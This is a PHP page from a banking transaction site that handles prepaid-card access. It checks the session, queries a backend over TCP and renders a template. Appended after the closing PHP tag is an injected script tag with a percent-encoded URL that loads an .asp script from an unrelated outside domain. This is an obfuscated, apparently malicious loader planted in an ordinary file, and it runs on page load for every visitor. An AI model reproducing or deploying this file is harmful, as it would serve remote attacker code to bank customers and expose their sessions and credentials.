<?php
//session_start();
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );
include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );
include_once("eztransaccion/user/include/general_functions.inc");
include_once("eztransaccion/user/include/controles_javascript.inc");


$session =& eZSession::globalSession();

if( !$session->fetch() )
	$session->store();

$ini =& $GLOBALS[ "GlobalSiteIni" ];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
$SecureServer	  = $ini->read_var( "site", "SecureServer" );

$SecureServerType = $ini->read_var( "site", "SecureServerType" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );


include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();


if ( $user )
{
	 $session =& eZSession::globalSession();



    if ( !$session->fetch() )
    {
        $session->store();
    }



    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $particularFields = "";

	$Access = $_POST['Access'];
	if(empty($Access) )
	{
		$Access = "FrAc";	
	}

	function ControlAcceso($menu,$usr)
	{
		include_once("eztransaccion/user/include/tcpipnexions.php");
		include_once("eztransaccion/user/include/xmlparser.inc");
			global $errors;

			//Mensaje - Nexions HM
			$trans = "<?xml version='1.0'?>";
			$trans .= "<mensaje><trxn value='tjp'/><accion value='envtjp'/><tipomsj value='rqs'/><CustID value='$usr'/>";
			$trans .= "<Opmenu value='" . $menu . "'/>";
			$trans .= "</mensaje>";
			//Mensaje

			//Conexion - Nexions HM
			$conn = new TCPIPNexions();

			if(!$conn->connect())
				  echo "<script> alert('  4501 - " .  $errors[4501]  . " ') </script>";

			if(!$conn->send($trans))
				  echo "<script> alert('  4501 - " .  $errors[4501]  . " ') </script>";

			$ans = $conn->receive();

			if(trim($ans)=="")
				  echo "<script> alert('  4501 - " .  $errors[4501]  . " ') </script>";

			$xml_struct = parse_xml(trim($ans));

			if (  trim($xml_struct["vals"][$xml_struct["index"]["ERRORNO"][0]]["attributes"]["VALUE"]) != "0000" )
					return  $xml_struct["vals"][$xml_struct["index"]["ERRORNO"][0]]["attributes"]["VALUE"] ." - " .$xml_struct["vals"][$xml_struct["index"]["ERRORNO"][0]]["attributes"]["DESC"];

			$conn->close();
			//Conexion

			return "0000";

	}
	$usr = strtolower($usr); 

//echo "[".$Access."]";
	if ($Access == "FrAc" )
	{
		
		
		$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
							 "eztransaccion/user/intl/", $Language, "tarjprepab.php" );

		$t->setAllStrings();
		 
		$t->set_file( array(
			"tarjprepab_tpl" => "tarjprepab.tpl"
			) );
			
		$t->set_var( "transaccion_buffer", $transaccion_buffer );

		$t->pparse( "output", "tarjprepab_tpl" );
		
		 $result = ControlAcceso("tarjprep",$usr);

    if($result=="0000")
    	include("eztransaccion/user/include/tarjprepab.inc");
    else
        echo $result;
		
	}
	else
	{
		include_once("eztransaccion/user/include/tarjprepab.inc");
	}
}
else
{
	 $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
					 "eztransaccion/user/intl/", $Language, "userlogin.php" );

	$t->setAllStrings();

	$t->set_file( array(
		"user_login_tpl" => "userlogin.tpl"
		) );

	$t->set_var( "redirect_url", "/transaccion/tarjprepab/" );
	$t->pparse( "output", "user_login_tpl" );
}

	
?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>